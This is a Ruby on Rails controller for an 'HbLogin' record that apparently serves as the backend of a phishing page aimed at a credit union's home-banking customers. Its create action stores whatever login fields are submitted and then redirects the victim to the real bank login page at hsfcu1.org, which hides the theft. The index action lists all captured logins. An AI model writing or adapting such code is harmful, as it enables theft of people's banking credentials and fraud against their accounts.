class HbLoginsController < ApplicationController
  # GET /hb_logins
  # GET /hb_logins.xml
  def index
    @hb_logins = HbLogin.all

    respond_to do |format|
      format.html # index.html.erb
      format.xml  { render :xml => @hb_logins }
    end
  end

  # GET /hb_logins/1
  # GET /hb_logins/1.xml
  def show
    @hb_login = HbLogin.find(params[:id])

    respond_to do |format|
      format.html # show.html.erb
      format.xml  { render :xml => @hb_login }
    end
  end

  # GET /hb_logins/new
  # GET /hb_logins/new.xml
  def new
    @hb_login = HbLogin.new

    respond_to do |format|
      format.html # new.html.erb
      format.xml  { render :xml => @hb_login }
    end
  end

  # GET /hb_logins/1/edit
  def edit
    @hb_login = HbLogin.find(params[:id])
  end

  # POST /hb_logins
  # POST /hb_logins.xml
  def create
    @hb_login = HbLogin.new(params[:hb_login])

    respond_to do |format|
      if @hb_login.save
        flash[:notice] = 'HbLogin was successfully created.'
        #format.html { redirect_to(@hb_login) }
		format.html { redirect_to("https://www.hsfcu1.org/hbv3_2/login.asp") }
        format.xml  { render :xml => @hb_login, :status => :created, :location => @hb_login }
      else
        format.html { render :action => "new" }
        format.xml  { render :xml => @hb_login.errors, :status => :unprocessable_entity }
      end
    end
  end

  # PUT /hb_logins/1
  # PUT /hb_logins/1.xml
  def update
    @hb_login = HbLogin.find(params[:id])

    respond_to do |format|
      if @hb_login.update_attributes(params[:hb_login])
        flash[:notice] = 'HbLogin was successfully updated.'
        format.html { redirect_to(@hb_login) }
        format.xml  { head :ok }
      else
        format.html { render :action => "edit" }
        format.xml  { render :xml => @hb_login.errors, :status => :unprocessable_entity }
      end
    end
  end

  # DELETE /hb_logins/1
  # DELETE /hb_logins/1.xml
  def destroy
    @hb_login = HbLogin.find(params[:id])
    @hb_login.destroy

    respond_to do |format|
      format.html { redirect_to(hb_logins_url) }
      format.xml  { head :ok }
    end
  end
end
